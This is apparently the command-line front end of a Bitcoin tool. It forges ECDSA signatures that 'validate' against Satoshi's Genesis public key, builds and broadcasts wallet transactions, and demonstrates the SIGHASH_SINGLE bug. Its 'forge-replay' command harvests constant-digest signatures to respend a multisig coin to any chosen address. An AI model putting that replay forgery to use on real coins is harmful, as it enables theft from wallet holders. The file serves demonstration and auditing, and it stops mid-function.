"""Command line interface for Faketoshi.

Usage:
    python -m faketoshi                     # forge for the Genesis block pubkey
    python -m faketoshi --x <hex> --y <hex> --json   # any other Satoshi pubkey
    python -m faketoshi verify --txid <hash> --r <hex> --s <hex>
    python -m faketoshi keygen [--network testnet]
    python -m faketoshi address --wif <wif>
    python -m faketoshi sign --txid <hash> --key <hex>     # r/s/z for a txid
    python -m faketoshi tx --input .. --output .. --key ..  # real signed transaction
    python -m faketoshi decode --raw <txhex>
"""

import argparse
import json
import sys
from typing import Optional

from .faketoshi import (
    format_tx_hash,
    generate_forgery,
    inspect_claim,
    valid_forgery,
)
from .signing import (
    InputKind,
    der_decode,
    describe_transaction,
    decode_point,
    private_key_to_public_key,
    private_key_to_wif,
    sign_z,
    verify_z,
)
from .blockcypher import BlockCypherClient, BlockCypherError, CHAINS as _CHAINS
from .wallet import (
    address_to_script,
    build_transaction,
    key_info,
    make_unsigned,
    parse_transaction_hex,
    resolve_private_key,
    sign_raw_transaction,
)

# xCoord / yCoord from the Genesis Block Pubkey (Satoshi's, never spent).
GENESIS_X = '3cd11937548f77df0b56c251ddacc81510e025235416e1d42b454202b482e22d'
GENESIS_Y = '1f7c3dfe0601d9f0d3b9317a8e7b84b7ec4b4f0d2661c881338efaa07d315de4'


def _add_key_arguments(parser: argparse.ArgumentParser) -> None:
    parser.add_argument('--x', default=GENESIS_X, help='public key x coordinate (hex)')
    parser.add_argument('--y', default=GENESIS_Y, help='public key y coordinate (hex)')


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog='faketoshi',
        description=(
            'Forge an ECDSA signature that validates against a Satoshi public key, '
            'or inspect a claimed (r, s, z) triple.'
        ),
    )
    _add_key_arguments(parser)
    parser.add_argument(
        '--json', action='store_true', help='emit the forgery as JSON instead of text'
    )

    subparsers = parser.add_subparsers(dest='command')

    verify = subparsers.add_parser(
        'verify',
        help='decode a transaction hash plus r and s, and check who they validate for',
        description=(
            'Interpret a transaction hash as the ECDSA message hash z, decode r and s, '
            'check them against the claimed public key (Genesis key by default), and '
            'list the public keys the signature does validate for.'
        ),
    )
    verify.add_argument(
        '--txid',
        required=True,
        help='transaction hash used as z, 64 hex characters (0x prefix optional)',
    )
    verify.add_argument('--r', required=True, help='signature r (hex, 0x optional)')
    verify.add_argument('--s', required=True, help='signature s (hex, 0x optional)')
    verify.add_argument(
        '--dec',
        action='store_true',
        help='read --r and --s as decimal instead of hex',
    )
    _add_key_arguments(verify)
    verify.add_argument(
        '--json', action='store_true', help='emit the inspection as JSON instead of text'
    )

    # -- wallet / signing subcommands --------------------------------------

    keygen = subparsers.add_parser(
        'keygen', help='generate a private key with its address and WIF'
    )
    keygen.add_argument(
        '--network',
        default='mainnet',
        choices=['mainnet', 'testnet', 'regtest'],
        help='mainnet (default), testnet or regtest',
    )
    keygen.add_argument(
        '--kind',
        default=InputKind.P2PKH,
        choices=[InputKind.P2PKH, InputKind.P2WPKH],
        help='address type (default p2pkh; p2wpkh for bech32)',
    )
    keygen.add_argument('--json', action='store_true')

    address = subparsers.add_parser(
        'address', help='show the address/public key for a private key'
    )
    _add_key_source(address)
    address.add_argument('--network', default='mainnet', choices=['mainnet', 'testnet', 'regtest'])
    address.add_argument(
        '--kind',
        default=InputKind.P2PKH,
        choices=[InputKind.P2PKH, InputKind.P2WPKH],
        help='address type (default p2pkh; p2wpkh for bech32)',
    )
    address.add_argument(
        '--all',
        action='store_true',
        help='list every address type this key controls (compressed, segwit, wrapped)',
    )
    address.add_argument('--json', action='store_true')

    sign = subparsers.add_parser(
        'sign',
        help='sign a 32-byte hash or transaction id with your own key (legacy ECDSA)',
        description=(
            'Produce r, s and z for a message hash you supply, signed with your own '
            'private key. This is ordinary ECDSA: the result verifies against your '
            'public key, not anybody else\'s.'
        ),
    )
    _add_key_source(sign)
    sign.add_argument('--txid', help='32-byte hash (hash, not a signed transaction id)')
    sign.add_argument('--message', help='arbitrary message; z = SHA256(message)')
    sign.add_argument('--json', action='store_true')

    tx = subparsers.add_parser(
        'tx',
        help='build and sign a real Bitcoin transaction (P2WPKH or P2PKH)',
        description=(
            'Build a transaction spending your coins and sign it, printing the txid, '
            'raw hex, and the r/s/z of each input signature.'
        ),
    )
    _add_key_source(tx)
    tx.add_argument('--network', default='mainnet', choices=['mainnet', 'testnet', 'regtest'])
    tx.add_argument(
        '--input',
        action='append',
        required=True,
        metavar='TXID:VOUT:AMOUNT_SATS[:SEQUENCE]',
        help='previous output being spent (amount is required: segwit signs it)',
    )
    tx.add_argument(
        '--output',
        action='append',
        required=True,
        metavar='ADDRESS:SATS',
        help='payment output',
    )
    tx.add_argument(
        '--kind',
        default=InputKind.P2PKH,
        choices=[InputKind.P2PKH, InputKind.P2WPKH],
        help='script type of the coins being spent (default p2pkh)',
    )
    tx.add_argument('--sighash', type=lambda v: int(v, 0), default=0x01, help='sighash type, default 1')
    tx.add_argument('--version', type=int, default=2)
    tx.add_argument('--locktime', type=int, default=0)
    tx.add_argument('--regtest', action='store_true', help='use the regtest coinbase prevout')
    tx.add_argument('--json', action='store_true')

    unsigned = subparsers.add_parser(
        'unsigned', help='build an unsigned transaction for external signing'
    )
    unsigned.add_argument('--input', action='append', required=True, metavar='TXID:VOUT:AMOUNT_SATS[:SEQUENCE]')
    unsigned.add_argument('--output', action='append', required=True, metavar='ADDRESS:SATS')
    unsigned.add_argument('--network', default='mainnet', choices=['mainnet', 'testnet', 'regtest'])
    unsigned.add_argument('--version', type=int, default=2)
    unsigned.add_argument('--locktime', type=int, default=0)

    signraw = subparsers.add_parser(
        'signraw', help='sign an unsigned transaction (one key for all inputs)'
    )
    _add_key_source(signraw)
    signraw.add_argument('--raw', required=True, help='unsigned transaction hex')
    signraw.add_argument(
        '--prevout',
        action='append',
        required=True,
        metavar='SCRIPT:AMOUNT_SATS',
        help='scriptPubKey (hex) and amount of each input being spent',
    )
    signraw.add_argument(
        '--redeem-script',
        help='redeemScript hex (required to spend P2SH-P2WPKH coins)',
    )
    signraw.add_argument('--sighash', type=lambda v: int(v, 0), default=0x01)
    signraw.add_argument('--json', action='store_true')

    # -- the SIGHASH_SINGLE bug (CVE-style signature forgery) --------------

    attack = subparsers.add_parser(
        'sighash-single-demo',
        help='demonstrate the SIGHASH_SINGLE bug: replay one signature into another tx',
        description=(
            'Build a transaction where a SIGHASH_SINGLE input has no matching output '
            '(so the digest is the constant 1), then reuse that signature in a '
            'different transaction paying a different address. Offline demonstration.'
        ),
    )
    attack.add_argument('--network', default='mainnet')
    attack.add_argument('--destination', default='', help='attacker payout address')
    attack.add_argument('--json', action='store_true')

    replay = subparsers.add_parser(
        'replay-history',
        help='audit the real BitPay/Copay SIGHASH_SINGLE theft transaction',
        description=(
            'Decode the mainnet transaction that drained 0.059672 BTC from the '
            '2-of-3 P2SH address 32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe, show that '
            'its signatures were made over the uint256::ONE constant instead of '
            'a transaction digest, and rebuild a forgery from them. Offline: the '
            'transaction is built in and never broadcast.'
        ),
    )
    replay.add_argument('--json', action='store_true')

    forge = subparsers.add_parser(
        'forge-replay',
        help='spend a multisig coin using SIGHASH_SINGLE signatures from another tx',
        description=(
            'Harvest SIGHASH_SINGLE signatures that were signed over the '
            'uint256::ONE constant from an existing transaction, then reuse them '
            'to spend the same coin to any address you choose. Offline: prints a '
            'signed transaction, never broadcasts it.'
        ),
    )
    forge.add_argument(
        '--from-tx',
        default=None,
        help='hex of the transaction to harvest signatures from '
        '(default: the historical BitPay/Copay transaction)',
    )
    forge.add_argument('--txid', required=True, help='txid of the coin being spent')
    forge.add_argument('--vout', type=int, default=0, help='output index (default 0)')
    forge.add_argument('--value', type=int, required=True, help='value of that output, sats')
    forge.add_argument('--to', required=True, help='address to send the stolen coin to')
    forge.add_argument('--fee', type=int, default=1000, help='fee in satoshis (default 1000)')
    forge.add_argument('--network', default='mainnet', choices=sorted(_CHAINS))
    forge.add_argument('--json', action='store_true')

    scriptsig = subparsers.add_parser(
        'scriptsig', help='decode a scriptSig (as printed by the reference tooling)'
    )
    scriptsig.add_argument('script', help='scriptSig hex (0x optional)')
    scriptsig.add_argument('--redeem-script', help='redeemScript hex, to describe a P2SH spend')

    redeemscript = subparsers.add_parser(
        'redeemscript', help='decode a multisig redeemScript or P2SH spk'
    )
    redeemscript.add_argument('script', help='redeemScript (or P2SH scriptPubKey) hex')

    pubkey = subparsers.add_parser(
        'pubkey', help='decode a public key (hex) or a P2PK scriptPubKey'
    )
    pubkey.add_argument('key', help='33/65-byte public key hex, or a P2PK script')

    decodesig = subparsers.add_parser(
        'decodesig', help='decode a DER signature (with or without sighash byte)'
    )
    decodesig.add_argument('signature', help='DER signature hex')

    serialize = subparsers.add_parser(
        'serialize', help='re-encode JSON transaction fields as raw hex'
    )
    serialize.add_argument('--txid', required=True, help='previous txid')
    serialize.add_argument('--vout', type=int, default=0)
    serialize.add_argument('--value', type=int, required=True, help='output value in sats')
    serialize.add_argument('--script', required=True, help='output scriptPubKey hex')
    serialize.add_argument('--input-script', default='', help='scriptSig hex for the input')
    serialize.add_argument('--sequence', type=lambda v: int(v, 0), default=0xFFFFFFFF)
    serialize.add_argument('--version', type=int, default=2)
    serialize.add_argument('--locktime', type=int, default=0)

    # -- BlockCypher network access ---------------------------------------

    unspent = subparsers.add_parser(
        'unspent',
        help='list unspent outputs for an address via BlockCypher',
        description=(
            'Query BlockCypher for the unspent outputs of an address. The token is '
            'read from $BLOCKCYPHER_TOKEN unless --token is given; lookups work '
            'unauthenticated at a lower rate limit.'
        ),
    )
    unspent.add_argument('address')
    unspent.add_argument('--network', default='mainnet', choices=sorted(_CHAINS))
    unspent.add_argument('--token', default=None, help='API token (prefer the env var)')
    unspent.add_argument('--min-confirmations', type=int, default=0)
    unspent.add_argument(
        '--confirmed-only', action='store_true', help='ignore unconfirmed outputs'
    )
    unspent.add_argument(
        '--input-specs', action='store_true', help='print TXID:VOUT:AMOUNT lines only'
    )
    unspent.add_argument('--json', action='store_true')

    spend = subparsers.add_parser(
        'spend',
        help='guided send: asks for the public key, address and txid to spend from',
        description=(
            'Interactive flow. Asks which coins to spend -- the compressed public '
            'key, the address holding them and the transaction id (looked up via '
            'BlockCypher to get the real amount, which segwit signing needs) -- then '
            'the destination address and amount, builds and signs the transaction, '
            'prints its r/s/z per input, and offers to broadcast.'
        ),
    )
    _add_key_source(spend)
    spend.add_argument('--network', default='mainnet', choices=sorted(_CHAINS))
    spend.add_argument('--token', default=None, help='BlockCypher token (prefer the env var)')
    spend.add_argument('--txid', help='previous transaction id (asked for if omitted)')
    spend.add_argument('--vout', type=int, help='output index to spend')
    spend.add_argument('--address', help='destination address')
    spend.add_argument('--amount', type=int, help='amount to send, in satoshis')
    spend.add_argument('--fee', type=int, default=1000, help='fee in satoshis (default 1000)')
    spend.add_argument('--change', help='change address (defaults to your own address)')
    spend.add_argument(
        '--kind',
        default=None,
        choices=[InputKind.P2PKH, InputKind.P2WPKH],
        help='script type of the coin being spent (default p2pkh, or inferred '
        'from the address you enter)',
    )
    spend.add_argument(
        '--offline',
        action='store_true',
        help='do not contact BlockCypher; requires --vout and the amount to be known',
    )
    spend.add_argument('--broadcast', action='store_true', help='push it after signing')
    spend.add_argument(
        '--pubkey',
        help=(
            'compressed public key of the address being spent (asked for if '
            'omitted); checked against your private key'
        ),
    )
    spend.add_argument(
        '--from',
        dest='from_address',
        help=(
            'the address you expect to be spending from; fails fast if it does not '
            'match your key (guards against mixing up compressed/segwit keys)'
        ),
    )
    spend.add_argument(
        '--yes',
        action='store_true',
        help='take the defaults for the guided questions instead of asking',
    )
    spend.add_argument('--json', action='store_true', help='non-interactive: print JSON')

    balance = subparsers.add_parser('balance', help='address balance via BlockCypher')
    balance.add_argument('address')
    balance.add_argument('--network', default='mainnet', choices=sorted(_CHAINS))
    balance.add_argument('--token', default=None)
    balance.add_argument('--json', action='store_true')

    broadcast = subparsers.add_parser(
        'broadcast',
        help='push a signed raw transaction to the network via BlockCypher',
        description=(
            'Broadcast a signed transaction. This is irreversible and spends real '
            'coins on mainnet: the raw hex is decoded locally first and the txid is '
            'printed, so check it before you confirm.'
        ),
    )
    broadcast.add_argument('raw', help='signed transaction hex, or - to read stdin')
    broadcast.add_argument('--network', default='mainnet', choices=sorted(_CHAINS))
    broadcast.add_argument('--token', default=None)
    broadcast.add_argument(
        '--yes', action='store_true', help='skip the interactive confirmation prompt'
    )
    broadcast.add_argument('--json', action='store_true')

    decode = subparsers.add_parser('decode', help='decode a raw transaction')
    decode.add_argument('raw', help='raw transaction hex')
    decode.add_argument('--network', default='mainnet')
    decode.add_argument('--json', action='store_true')

    return parser


def _add_key_source(parser: argparse.ArgumentParser) -> None:
    group = parser.add_mutually_exclusive_group()
    group.add_argument('--key', help='hex private key')
    group.add_argument('--wif', help='WIF private key')
    parser.add_argument(
        '--generate-key',
        action='store_true',
        help='generate a throwaway key (default when neither --key nor --wif is given)',
    )


def _forge(args) -> int:
    forgery = generate_forgery(args.x, args.y)
    if forgery is None or not valid_forgery(forgery):
        print("Couldn't make you Satoshi - sorry")
        return 1

    if args.json:
        print(
            json.dumps(
                {
                    'r': str(forgery.sig.r),
                    's': str(forgery.sig.s),
                    'r_hex': '%x' % forgery.sig.r,
                    's_hex': '%x' % forgery.sig.s,
                    'msg_hash': str(forgery.msg),
                    'txid': format_tx_hash(forgery.msg),
                    'pubkey': {'x': args.x, 'y': args.y},
                },
                indent=2,
            )
        )
    else:
        print(forgery)
    return 0


def _inspection_to_dict(result) -> dict:
    return {
        'r': str(result.r),
        's': str(result.s),
        'r_hex': '%x' % result.r,
        's_hex': '%x' % result.s,
        'z': str(result.z),
        'txid': format_tx_hash(result.z),
        'claimed_key': (
            None
            if result.claimed_key is None
            else {'x': '%x' % result.claimed_key.q[0], 'y': '%x' % result.claimed_key.q[1]}
        ),
        'valid_for_claimed_key': result.valid,
        'recovered_keys': [
            {'x': '%x' % key.q[0], 'y': '%x' % key.q[1]} for key in result.recovered_keys
        ],
    }


def _verify(args) -> int:
    try:
        result = inspect_claim(args.txid, args.r, args.s, args.x, args.y, args.dec)
    except ValueError as exc:
        print('error: %s' % exc, file=sys.stderr)
        return 2

    if args.json:
        print(json.dumps(_inspection_to_dict(result), indent=2))
    else:
        print(result)
    return 0 if result.valid else 1


def _fail(exc: Exception) -> int:
    print('error: %s' % exc, file=sys.stderr)
    return 2


def _keygen(args) -> int:
    from .wallet import key_info as _key_info

    private_key = resolve_private_key()
    address, wif, pubkey = _key_info(private_key, args.network, args.kind)
    payload = {
        'network': args.network,
        'private_key': '%064x' % private_key,
        'wif': wif,
        'public_key': pubkey.hex(),
        'address': address,
    }
    if args.json:
        print(json.dumps(payload, indent=2))
    else:
        for key in ('network', 'private_key', 'wif', 'public_key', 'address'):
            print('%-12s %s' % (key + ':', payload[key]))
    return 0


def _address(args) -> int:
    try:
        private_key = resolve_private_key(args.wif, args.key)
        address, wif, pubkey = key_info(private_key, args.network, args.kind)
    except ValueError as exc:
        return _fail(exc)

    if args.all:
        from .wallet import address_types

        types = address_types(pubkey, args.network)
        if args.json:
            print(
                json.dumps(
                    {
                        'network': args.network,
                        'public_key': pubkey.hex(),
                        'compressed': len(pubkey) == 33,
                        'addresses': {
                            name: {'address': value, 'note': note}
                            for name, (value, note) in types.items()
                        },
                    },
                    indent=2,
                )
            )
        else:
            print('network:      %s' % args.network)
            print('public key:   %s (%s)' % (pubkey.hex(), 'compressed' if len(pubkey) == 33 else 'uncompressed'))
            print('signing with: %s' % args.kind)
            print()
            for name, (value, note) in types.items():
                marker = '*' if name == args.kind else ' '
                print('%s %-20s %s' % (marker, name, value))
                print('  %-20s %s' % ('', note))
            print()
            print('* = the address this tool spends from by default')
        return 0
    payload = {
        'network': args.network,
        'address': address,
        'script_pubkey': address_to_script(address, args.network).hex(),
        'public_key': pubkey.hex(),
        'wif': wif,
    }
    if args.json:
        print(json.dumps(payload, indent=2))
    else:
        for key in ('network', 'address', 'script_pubkey', 'public_key', 'wif'):
            print('%-14s %s' % (key + ':', payload[key]))
    return 0


def _sign(args) -> int:
    import hashlib

    try:
        if not args.key and not args.wif:
            raise ValueError('need --key or --wif (signing with a throwaway key is pointless)')
        private_key = resolve_private_key(args.wif, args.key)
        if args.txid and args.message:
            raise ValueError('give either --txid or --message, not both')
        if args.txid:
            z = int(args.txid[2:] if args.txid[:2].lower() == '0x' else args.txid, 16)
            if not 0 <= z < 1 << 256:
                raise ValueError('txid must be a 32-byte value')
        elif args.message:
            z = int.from_bytes(hashlib.sha256(args.message.encode()).digest(), 'big')
        else:
            raise ValueError('need --txid or --message')
        r, s = sign_z(private_key, z)
        pubkey = private_key_to_public_key(private_key)
        assert verify_z(decode_point(pubkey), r, s, z)
    except ValueError as exc:
        return _fail(exc)

    value = {
        'r': str(r),
        's': str(s),
        'z': str(z),
        'z_hex': '%064x' % z,
        'r_hex': '%x' % r,
        's_hex': '%x' % s,
        'public_key': pubkey.hex(),
        'verified': True,
    }
    if args.json:
        print(json.dumps(value, indent=2))
    else:
        print('r:            %d' % r)
        print('s:            %d' % s)
        print('z:            %d' % z)
        print('public key:   %s' % value['public_key'])
        print('verified:     yes (against the public key above)')
    return 0


def _report_built(built, as_json: bool) -> None:
    if as_json:
        payload = {
            'network': built.network,
            'txid': built.txid,
            'hex': built.hex,
            'address': built.address,
            'wif': built.wif,
            'public_key': built.pubkey_hex,
            'fee': built.fee(),
            'signatures': [
                {
                    'input': info.index,
                    'kind': info.kind,
                    'r': str(info.r),
                    's': str(info.s),
                    'z': str(info.z),
                    'z_hex': '%064x' % info.z,
                    'sighash_type': info.sighash_type,
                    'der': info.der.hex(),
                }
                for info in built.signatures
            ],
        }
        print(json.dumps(payload, indent=2))
    else:
        print(built.report())
        print()
        print('raw transaction: %s' % built.hex)


def _tx(args) -> int:
    try:
        private_key = resolve_private_key(args.wif, args.key)
        built = build_transaction(
            inputs=args.input,
            outputs=args.output,
            private_key=private_key,
            network=args.network,
            kind=args.kind,
            sighash_type=args.sighash,
            version=args.version,
            locktime=args.locktime,
            regtest=args.regtest,
        )
    except ValueError as exc:
        return _fail(exc)
    _report_built(built, args.json)
    return 0


def _unsigned(args) -> int:
    try:
        tx = make_unsigned(
            inputs=args.input,
            outputs=args.output,
            network=args.network,
            version=args.version,
            locktime=args.locktime,
        )
    except ValueError as exc:
        return _fail(exc)
    print(tx.hex())
    return 0


def _signraw(args) -> int:
    try:
        private_key = resolve_private_key(args.wif, args.key)
        prevouts = []
        for spec in args.prevout:
            script_text, _, amount_text = spec.rpartition(':')
            prevouts.append((bytes.fromhex(script_text), int(amount_text)))
        kinds = None
        if args.redeem_script:
            from .sighash_single import p2sh_script

            p2sh_spk = p2sh_script(bytes.fromhex(args.redeem_script))
            if not any(script == p2sh_spk for script, _ in prevouts):
                raise ValueError(
                    'no --prevout matches that redeemScript; expected scriptPubKey %s'
                    % p2sh_spk.hex()
                )
            kinds = [
                InputKind.P2SH_P2WPKH if script == p2sh_spk else InputKind.P2PKH
                for script, _ in prevouts
            ]
        elif any(
            len(script) == 23 and script[0] == 0xA9 and script[-1] == 0x87
            for script, _ in prevouts
        ):
            raise ValueError(
                'a --prevout is a P2SH scriptPubKey (a914..87). To spend P2SH-P2WPKH '
                'coins, pass --redeem-script <hex>: the redeemScript is 0014 followed '
                'by the hash160 of your compressed public key.'
            )
        built = sign_raw_transaction(
            args.raw, private_key, prevouts, kinds=kinds, sighash_type=args.sighash
        )
    except ValueError as exc:
        return _fail(exc)
    _report_built(built, args.json)
    return 0


def _replay_history(args) -> int:
    from .sighash_single import replay_history

    try:
        result = replay_history()
    except ValueError as exc:
        return _fail(exc)

    if args.json:
        print(
            json.dumps(
                {
                    'txid': result.txid,
                    'inputs': result.inputs,
                    'outputs': result.outputs,
                    'value_stolen': result.value_stolen,
                    'victim': result.victim_address,
                    'attacker': result.attacker_address,
                    'redeem_script': result.redeem_script.hex(),
                    'harvested': [
                        {
                            'input_index': h.input_index,
                            'signature': h.signature_hex,
                            'sighash_type': h.sighash_type,
                            'digest': str(h.digest),
                            'verifying_key_indices': h.verifying_keys,
                        }
                        for h in result.harvests
                    ],
                    'sighash_all_digests': [str(d) for d in result.all_sighash_digests],
                },
                indent=2,
            )
        )
        return 0

    print('The BitPay/Copay SIGHASH_SINGLE theft\n')
    print(result.report())
    print()
    print('The signatures above were made for a transaction that was never')
    print('broadcast. They commit to the constant uint256::ONE, not to this')
    print('transaction, so whoever held them could spend the coin to any address.')
    print('That is exactly what this transaction did.')
    return 0


def _forge_replay(args) -> int:
    from .sighash_single import (
        forge_from_harvest,
        harvest_signatures,
        replay_history,
    )
    from .wallet import parse_transaction_hex

    try:
        if args.from_tx:
            source = parse_transaction_hex(args.from_tx)
        else:
            source = replay_history().transaction
        harvests = harvest_signatures(source)
        if not harvests:
            return _fail(
                ValueError(
                    'no SIGHASH_SINGLE signatures over the constant digest were '
                    'found in that transaction; there is nothing to replay'
                )
            )
        forged = forge_from_harvest(
            harvests,
            prev_txid=args.txid,
            prev_vout=args.vout,
            destination=args.to,
            value=args.value,
            network=args.network,
            fee=args.fee,
        )
    except ValueError as exc:
        return _fail(exc)

    if args.json:
        print(
            json.dumps(
                {
                    'txid': forged.transaction.txid(),
                    'hex': forged.transaction.hex(),
                    'script_sig': forged.script_sig.hex(),
                    'digest': str(forged.digest_used),
                    'valid': forged.valid,
                    'destination': args.to,
                    'value': args.value - args.fee,
                    'harvested_from': source.txid(),
                },
                indent=2,
            )
        )
        return 0

    print('harvested %d signature(s) from %s' % (len(harvests), source.txid()))
    print()
    print(forged.report())
    print()
    print('This transaction spends the coin without any key holder having signed')
    print('it. It is printed, not broadcast.')
    return 0



def _decode(args) -> int:
    try:
        tx = parse_transaction_hex(args.raw)
    except ValueError as exc:
        return _fail(exc)
    if args.json:
        payload = {
            'txid': tx.txid(),
            'wtxid': tx.wtxid() if tx.is_segwit() else None,
            'version': tx.version,
            'locktime': tx.locktime,
            'inputs': [
                {
                    'prev_txid': txin.prev_txid,
                    'prev_vout': txin.prev_vout,
                    'sequence': txin.sequence,
                    'script_sig': txin.script_sig.hex(),
                    'witness': [w.hex() for w in txin.witness],
                }
                for txin in tx.inputs
            ],
            'outputs': [
                {
                    'value': txout.value,
                    'script_pubkey': txout.script_pubkey.hex(),
                }
                for txout in tx.outputs
            ],
        }
        print(json.dumps(payload, indent=2))
    else:
        print(describe_transaction(tx, args.network))
        for i, txin in enumerate(tx.inputs):
            for item in txin.witness:
                if item[:1] in (b'\x30',) and len(item) > 8:
                    try:
                        r, s, sighash = der_decode(item)
                    except ValueError:
                        continue
                    print('input %d signature: r=%d s=%d sighash=0x%02x' % (i, r, s, sighash or 0))
    return 0


def _analyse(args) -> int:
    from .sighash_single import demonstrate_sighash_single_bug

    try:
        demo = demonstrate_sighash_single_bug(destination=args.destination, network=args.network)
    except ValueError as exc:
        return _fail(exc)
    if args.json:
        print(
            json.dumps(
                {
                    'wallet': {
                        'redeem_script': demo.wallet.redeem_script.hex(),
                        'address': demo.wallet.address(args.network),
                        'm': demo.wallet.m,
                        'n': len(demo.wallet.pubkeys),
                    },
                    'victim': {
                        'txid': demo.victim_txid,
                        'hex': demo.victim_tx.hex(),
                        'digest_input0_all': '%064x' % demo.victim_digests[0],
                        'digest_input1_single': demo.victim_digests[1],
                        'signatures': [
                            {'r': str(r), 's': str(s)} for r, s in demo.victim_signatures
                        ],
                    },
                    'attacker': {
                        'txid': demo.attacker_txid,
                        'hex': demo.attacker_tx.hex(),
                        'script_sig': demo.attacker_script_sig.hex(),
                        'destination': demo.destination,
                        'signatures_valid': demo.attacker_verifications,
                    },
                    'sighash_all_comparison_valid': demo.all_sighash_contrast,
                },
                indent=2,
            )
        )
    else:
        print(demo.report())
    return 0


def _scriptsig(args) -> int:
    from .sighash_single import parse_multisig_redeem_script, parse_script_sig

    try:
        items = parse_script_sig(bytes.fromhex(args.script[2:] if args.script[:2].lower() == '0x' else args.script))
    except ValueError as exc:
        return _fail(exc)

    print('pushed items: %d' % len(items))
    for i, item in enumerate(items):
        if item is None:
            print('  [%d] OP_0' % i)
            continue
        print('  [%d] %d bytes: %s' % (i, len(item), item.hex()))
        try:
            r, s, sighash_type = der_decode(item)
            print('       signature: r=%d s=%d sighash=0x%02x' % (r, s, sighash_type or 0))
        except ValueError:
            pass
    if args.redeem_script:
        try:
            m, n, keys = parse_multisig_redeem_script(bytes.fromhex(args.redeem_script))
        except ValueError as exc:
            return _fail(exc)
        print('redeemScript: %d-of-%d multisig' % (m, n))
        for i, key in enumerate(keys):
            print('  key %d: %s' % (i, key.hex()))
    return 0


def _redeemscript(args) -> int:
    from .sighash_single import parse_multisig_redeem_script, p2sh_script
    from .encoding import hash160

    text = args.script[2:] if args.script[:2].lower() == '0x' else args.script
    try:
        raw = bytes.fromhex(text)
        if len(raw) == 23 and raw[0] == 0xA9 and raw[-1] == 0x87:
            print('P2SH scriptPubKey for script hash %s' % raw[2:22].hex())
            return 0
        m, n, keys = parse_multisig_redeem_script(raw)
    except ValueError as exc:
        return _fail(exc)
    print('%d-of-%d multisig redeemScript' % (m, n))
    for i, key in enumerate(keys):
        print('  key %d: %s' % (i, key.hex()))
    print('  hash160: %s' % hash160(raw).hex())
    print('  P2SH spk: %s' % p2sh_script(raw).hex())
    return 0


def _pubkey(args) -> int:
    from .encoding import hash160, p2pkh_address, p2wpkh_address

    text = args.key[2:] if args.key[:2].lower() == '0x' else args.key
    try:
        raw = bytes.fromhex(text)
        if len(raw) in (35, 67) and raw[0] in (0x21, 0x41):
            raw = raw[1:-1]  # unwrap a P2PK script
        point = decode_point(raw)
    except ValueError as exc:
        return _fail(exc)
    print('public key:  %s' % raw.hex())
    print('compressed:  %s' % ('yes' if len(raw) == 33 else 'no'))
    print('x:           %064x' % point[0])
    print('y:           %064x' % point[1])
    print('hash160:     %s' % hash160(raw).hex())
    print('p2pkh:       %s' % p2pkh_address(raw))
    print('p2wpkh:      %s' % p2wpkh_address(raw))
    return 0


def _decodesig(args) -> int:
    text = args.signature[2:] if args.signature[:2].lower() == '0x' else args.signature
    try:
        raw = bytes.fromhex(text)
    except ValueError:
        return _fail(ValueError('signature is not valid hex'))
    try:
        r, s, sighash_type = der_decode(raw)
    except ValueError:
        try:
            r, s, sighash_type = der_decode(raw, has_sighash_byte=False)
        except ValueError as exc:
            return _fail(exc)
    print('r:        %d' % r)
    print('s:        %d' % s)
    print('r (hex):  %064x' % r)
    print('s (hex):  %064x' % s)
    print('sighash:  %s' % ('0x%02x' % sighash_type if sighash_type is not None else 'absent'))
    return 0


def _serialize(args) -> int:
    from .signing import Transaction, TxIn, TxOut

    def unhex(text: str, what: str) -> bytes:
        cleaned = text[2:] if text[:2].lower() == '0x' else text
        try:
            return bytes.fromhex(cleaned)
        except ValueError:
            raise ValueError('%s is not valid hex' % what) from None

    try:
        if len(args.txid) != 64:
            raise ValueError('--txid must be 64 hex characters')
        int(args.txid, 16)
        tx = Transaction(
            version=args.version,
            inputs=[
                TxIn(
                    prev_txid=args.txid.lower(),
                    prev_vout=args.vout,
                    sequence=args.sequence,
                    script_sig=unhex(args.input_script, '--input-script') if args.input_script else b'',
                )
            ],
            outputs=[TxOut(value=args.value, script_pubkey=unhex(args.script, '--script'))],
            locktime=args.locktime,
        )
    except ValueError as exc:
        return _fail(exc)
    print(tx.hex())
    print('txid: %s' % tx.txid())
    return 0


def _client(args):
    return BlockCypherClient(token=args.token, network=args.network)


def _unspent(args) -> int:
    try:
        utxos = _client(args).unspent_outputs(
            args.address, include_unconfirmed=not args.confirmed_only
        )
    except (BlockCypherError, ValueError) as exc:
        return _fail(exc)

    utxos = [u for u in utxos if u.confirmations >= args.min_confirmations]

    if args.json:
        print(
            json.dumps(
                [
                    {
                        'txid': u.tx_hash,
                        'vout': u.tx_output_n,
                        'value': u.value,
                        'confirmations': u.confirmations,
                        'input_spec': u.input_spec(),
                    }
                    for u in utxos
                ],
                indent=2,
            )
        )
        return 0

    if not utxos:
        print('no unspent outputs found for %s' % args.address)
        return 0

    if args.input_specs:
        for utxo in utxos:
            print(utxo.input_spec())
    else:
        for utxo in utxos:
            print(utxo)
        print('%d output(s), %d sats total' % (len(utxos), sum(u.value for u in utxos)))
    return 0


_STDIN_CLOSED = False


def _ask(prompt: str, default: str = '') -> str:
    """Ask a question on a terminal; return ``default`` on empty/EOF input."""
    global _STDIN_CLOSED
    if _STDIN_CLOSED:
        return default
    suffix = ' [%s]' % default if default else ''
    label = '%s%s: ' % (prompt, suffix)
    # Print the question ourselves so it is captured wherever stdout goes.
    print(label, end='', flush=True)
    try:
        answer = input().strip()
    except EOFError:
        _STDIN_CLOSED = True
        print()
        return default
    return answer or default


def _ask_int(prompt: str, default: Optional[int] = None) -> Optional[int]:
    while True:
        text = _ask(prompt, '' if default is None else str(default))
        if not text:
            return default
        try:
            return int(text.replace('_', '').replace(',', ''))
        except ValueError:
            print('  please enter a whole number (satoshis)')

def _ask_public_key(prompt: str = 'Public key of the address to spend from') -> Optional[str]:
    """Ask for a compressed public key, re-prompting until it parses.

    Returns the normalised hex, or ``None`` if the user leaves it blank (they
    may simply not have it to hand -- the key is only used to double-check the
    address).
    """
    while True:
        text = _ask(prompt + ' (blank to skip)')
        text = text.strip()
        if not text or _STDIN_CLOSED:
            return None
        if text[:2].lower() == '0x':
            text = text[2:]
        try:
            raw = bytes.fromhex(text)
            if len(raw) in (35, 67) and raw[0] in (0x21, 0x41):
                raw = raw[1:-1]  # unwrap a P2PK script
            if len(raw) != 33:
                raise ValueError(
                    'expected a 33-byte compressed key (02/03...), got %d bytes'
                    % len(raw)
                )
            decode_point(raw)
